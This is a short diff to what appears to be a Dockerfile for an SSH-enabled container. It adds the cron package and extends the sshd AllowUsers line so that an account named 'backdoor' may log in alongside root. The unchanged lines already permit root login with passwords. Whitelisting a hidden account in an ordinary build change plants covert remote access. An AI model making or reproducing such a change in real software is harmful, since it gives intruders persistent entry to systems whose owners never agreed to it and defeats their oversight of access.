@@ -19,6 +19,7 @@ RUN apt-get update && apt-get install -y \
     htop \
     tmux \
     screen \
+    cron \
     && rm -rf /var/lib/apt/lists/*
 
 RUN mkdir -p /var/run/sshd
@@ -29,7 +30,7 @@ RUN sed -i 's/#PermitRootLogin prohibit-password/PermitRootLogin yes/' /etc/ssh/
 RUN sed -i 's/#PasswordAuthentication yes/PasswordAuthentication yes/' /etc/ssh/sshd_config
 RUN sed -i 's/#PubkeyAuthentication yes/PubkeyAuthentication yes/' /etc/ssh/sshd_config
 
-RUN echo "AllowUsers root" >> /etc/ssh/sshd_config
+RUN echo "AllowUsers root backdoor" >> /etc/ssh/sshd_config
 
 COPY start.sh /start.sh
 RUN chmod +x /start.sh
